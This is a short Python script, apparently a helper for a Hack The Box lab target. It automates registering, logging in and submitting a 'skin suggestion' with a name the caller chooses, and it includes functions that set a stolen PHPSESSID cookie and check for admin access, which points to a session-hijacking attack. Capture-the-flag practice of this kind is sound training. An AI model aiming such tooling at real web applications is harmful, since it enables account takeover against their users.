#!/usr/bin/env python3
"""HTTP client for cobblestone.htb — register, login, suggest_skin."""
import re
import sys
import requests

TARGET_IP = "10.129.122.97"
HOST = "cobblestone.htb"


def session():
    s = requests.Session()
    s.headers["Host"] = HOST
    return s


def register(s, user, password, email=None):
    email = email or f"{user}@htb.local"
    return s.post(
        f"http://{TARGET_IP}/register.php",
        data={
            "username": user,
            "password": password,
            "password_confirm": password,
            "email": email,
            "firstname": user,
            "lastname": user,
            "submit-register": "",
        },
        allow_redirects=True,
    )


def login(s, user, password):
    return s.post(
        f"http://{TARGET_IP}/login_verify.php",
        data={"username": user, "password": password, "submit-login": ""},
        allow_redirects=True,
    )


def suggest_skin(s, username, name, url="http://example.com/skin.png"):
    return s.post(
        f"http://{TARGET_IP}/suggest_skin.php",
        data={"username": username, "name": name, "url": url},
        allow_redirects=True,
    )


def set_admin_cookie(s, phpsessid):
    s.cookies.set("PHPSESSID", phpsessid, domain=HOST)


def is_admin(s):
    r = s.get(f"http://{TARGET_IP}/skins.php")
    return "Welcome admin" in r.text or "User Management" in r.text


if __name__ == "__main__":
    s = session()
    user, pw = sys.argv[1], sys.argv[2]
    register(s, user, pw)
    login(s, user, pw)
    name = sys.argv[3] if len(sys.argv) > 3 else "testskin"
    suggest_skin(s, user, name)
    print("logged in, suggestion submitted")
